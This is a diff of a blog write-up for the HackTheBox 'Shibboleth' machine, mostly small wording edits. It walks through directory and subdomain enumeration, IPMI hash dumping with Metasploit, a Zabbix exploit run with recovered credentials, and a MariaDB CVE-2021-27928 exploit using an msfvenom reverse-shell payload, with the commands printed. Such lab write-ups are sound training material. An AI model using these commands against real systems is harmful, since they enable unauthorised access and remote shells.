@@ -16,7 +16,6 @@ categories:
   - hackthebox
   - infosec
 tag:
-    - DNS
     - UDP
     - IPMI
     - Zabbix
@@ -48,9 +47,11 @@ PORT   STATE SERVICE
 
 ### HTTP
 
-added new shibboleth.htb into hosts file, because only port 80 is open, i use feroxbuster to scan the directory.
+added new shibboleth.htb into hosts file, because only port 80 is open.
 
 ![](/assets/img/shibolleth/1.png)
+
+then i use feroxbuster to scan directory
 
 feroxbuster result:
 
@@ -74,7 +75,7 @@ feroxbuster result:
 403      GET        9l       28w      279c http://shibboleth.htb/server-status
 ```
 
-inside /get we will see two files
+inside /get we only see two files
 
 ![](/assets/img/shibolleth/2.png)
 
@@ -99,11 +100,11 @@ ffuf -c -u http://shibolleth.htb -w /usr/share/seclists/Discover/DNS/subdomains-
 
 ![](/assets/img/shibolleth/3.png)
 
-added new sub domains into hosts file again, accessing this page http://zabbix.shibboleth.htb/ will find login page
+added new sub domains into hosts file again, accessing this page [zabbix](http://zabbix.shibboleth.htb/) will find login page
 
 ![](/assets/img/shibolleth/4.png)
 
-find a lot of exploit script using tools `searchsploit`
+find a lot of exploit too using `searchsploit`
 
 ![](/assets/img/shibolleth/5.png)
 
@@ -124,7 +125,7 @@ PORT    STATE SERVICE
 
 according on [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval) we able to dump hash from rmcp using metasploit.
 
-in metasploit we will use the ipmi module with following setup:
+in metasploit we should use the ipmi module with following setup:
 
 ```
 use scanner/ipmi/ipmi_dumphashes
@@ -132,7 +133,7 @@ set output_hashcat_file yes
 set rhost ip-shibolleth
 ```
 
-execute command run will obtain hashes administrator
+execute command `run` will obtain hashes for administrator user
 
 ![](/assets/img/shibolleth/8.png)
 
@@ -165,11 +166,11 @@ python 50816.py http://monitoring.shibboleth.htb/ Administrator ilovepumkinpie1 
 
 ## Privilege Escalation
 
-password reuse for user ipmi-svc, and on enumeration i managed to find the config file
+password reuse for user ipmi-svc, and on enumeration i managed to find the configuration file
 
 ![](/assets/img/shibolleth/12.png)
 
-read the file configuration and find the credentials for Maria Database
+read the configuration file and find the credentials for Maria Database
 
 ```bash
 ### Option: DBHost
@@ -192,7 +193,7 @@ DBPassword=bloooarskybluh
 ### Option: DBPort
 ```
 
-mysql running locally, lets dump it
+mysql service running locally on port 3306 by default, lets dump it
 
 ![](/assets/img/shibolleth/13.png)
 
@@ -200,13 +201,13 @@ get the information from table users
 
 ![](/assets/img/shibolleth/14.png)
 
-thats hash didnt show me the way, so the thing is we had to exploit the maria db
+thats hash didnt show me the way, so the thing is we had to exploit the mysql version
 
 ![](/assets/img/shibolleth/15.png)
 
-this maria db version affected of CVE-2021-27928, you can read the poc in [here](https://github.com/Al1ex/CVE-2021-27928).
+this MariaDB version affected of CVE-2021-27928, you can read the poc in [here](https://github.com/Al1ex/CVE-2021-27928).
 
-create the payload and upload into target in folder /tmp
+create the payload using `msfvenom` and upload into target in /tmp folder
 
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=9002 -f elf-so -o CVE-2021-27928.so
